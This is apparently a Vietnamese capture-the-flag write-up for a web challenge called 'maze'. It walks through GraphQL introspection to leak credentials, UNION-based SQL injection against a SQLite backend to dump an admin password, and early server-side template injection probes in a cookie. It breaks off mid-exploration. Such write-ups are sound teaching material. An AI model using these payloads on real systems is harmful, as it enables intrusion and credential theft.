Mô tả challenge:
maze
477
maze corparate just started a new trading platform, let's hope its secure because I got all my funds over there

Okay, bây giờ thì triển thôi

Được link được cung cấp dẫn đến ngay một trang login.
Theo thói quen thì mỗi khi gặp trang như vậy, lỗi đầu tiên mình nghĩ ngay đến là SQLinjecition. 
Thử một vài payload để kiểm tra:

username=&password=
username=a&password=
username=&password=a
username=a&password=a
username=a'&password=a
username=a'--&password=a
username=a&password=a'
username='&password=a' OR '1'='1
username='&password=a' AND SLEEP(5);--
...

Ngoại trừ 3 payload đầu tiên trả về lỗi 500 do để trống parameter thì các payload còn lại đều k thành công. Vậy khả năng cao là không phải lỗi SQLinjection. 
Ngoài parameter trong POST request thì còn các vị trí có thể truyền payload như cookie, url, ...
Cookie không có gì vậy có thể là nằm ở url, kinh điển nhất, mình thử tìm file robots.txt và may mắn là đoán phát ăn luôn :v

File robots.txt chứa api của graphql playground. Thực hiện khai thác GraphQL back-end schema bằng lệnh query Instrospeciton.
Đem kết kết trả về đưa vào GraphQL Voyager để dễ nhìn hơn.
Có thể thấy trong TradeObject có field username và CoinObject chứa field password. 
Query để lấy giá trị của hai trường này:
{
  allTraders {
    edges {
      node {
        username
        id
        coins{
          edges {
            node {
              password
              title
              authorId
            }
          }
        }
      }
      
    }
  }
}
Kết quả trả về :
{
  "data": {
    "allTraders": {
      "edges": [
        {
          "node": {
            "username": "pop_eax",
            "id": "VHJhZGVyT2JqZWN0OjE=",
            "coins": {
              "edges": [
                {
                  "node": {
                    "password": "iigvj3xMVuSI9GzXhJJWNeI",
                    "title": "XFT",
                    "authorId": 1
                  }
                }
              ]
            }
          }
        }
      ]
    }
  }
}

Vậy là có đủ username và password, hí hửng đem đi login thì ... vẫn không được :)
Vậy là mình dậm chân tại chỗ với trang graphQL và cái username + password kiếm được mà xài không được. 
Sau đó thì được đàn anh khai mở tri thức cho mới thử đổi cái username thành tittle trong CoinObject và bùm, login thành công.

Nhưng mà vẫn chưa xong, login rồi flag vẫn chưa xuất hiện :(
Loanh quanh một hồi mình phát hiện mấy cái trang thông tin về coin này có url như sau:
http://207.180.200.166:9000/trade?coin=ten-coin

Nghĩa là GET parameter coin nhận được tên coin nào sẽ load thông tin của coin tương ứng. Điều này làm mình nghĩ đến mấy câu lệnh như
SELECT * FROM coins WHERE coin='ten-coin';

Tiếp tục thử bằng một số payload quen thuộc:
coin=xft'   => lỗi
coin=xft'-- => load thành công
coin=xft' OR 1=1 -- => load thành công

Vậy có thể khai thác lỗi SQLinjection trên parameter này.
Kiểm tra câu lệnh select được sử dụng truy vấn bao nhiêu cột bằng cách:
coin=' UNION SELECT '1  => lỗi 500
coin=' UNION SELECT '1','2  => thành công

Việc tiếp theo là tìm trong cơ sở dữ liệu này có chưa flag hoặc thông tin để dăng nhập trang admin hay không.
coin=' UNION SELECT '1',group_concat(table_name) FROM information_schema.tables --  => lỗi 500
Vậy không phải đang sử dụng mySQL, thử payload dành cho SQL Lite:
coin=' UNION SELECT '1',group_concat(name) FROM sqlite_master WHERE type='table  => thành công
Trong csdl có bảng admin, tìm tên các cột trong bảng này bằng câu lệnh sau
coin=' UNION SELECT '1',group_concat(sql) FROM sqlite_master WHERE tbl_name = 'admin

Lấy thông tin từ bảng admin:
coin=' UNION SELECT '1', group_concat(admin) FROM admin --
coin=' UNION SELECT '1', group_concat(password) FROM admin --

Account của admin là: admin:p0To3zTQuvFDzjhO9

Sau khi đăng nhập admin vẫn chưa thấy flag, dạo quanh trang một vòng không thấy cung cấp service gì để có hướng khai thác như 2 trang trước, mình định brute directory nhưng cũng có vẻ không khả thi nên khá stuck.
Quay lại với phương pháp tìm kiếm từ những nơi có thể gửi payload thì mình phát hiện trong cookie ngoài session để login còn có 'name'. 

Giá trị của 'name'  sẽ được hiển thị lên màn hình. Điều này làm mình nghĩ đến lỗi XSS nhưng có vẻ không hợp lí vì trang này không phải dạng blog hay comment để chiếm session cookie của admin (hơn nữa mình đã đăng nhập với tư cách admin rồi @@). Dù sao cũng check thử cho chắc:
name=<img src=1 onerror='alert(1)'> => Kết quả k thành công

Còn một lỗi cũng nhận giá trị từ user và hiển thị lên trang web mà mình nghĩ đến trong trường hợp này là SSTI. Thử payload:
{{1+1}}

1+1=2, vậy là mình đã đoán đúng, lỗi có thể khai thác là SSTI.

Thử tiếp payload 
{{self}} => <TemplateReference None>

{{self.__dict__}}

There is url_for and get_flash_message
Try {{url_for.__global__}}




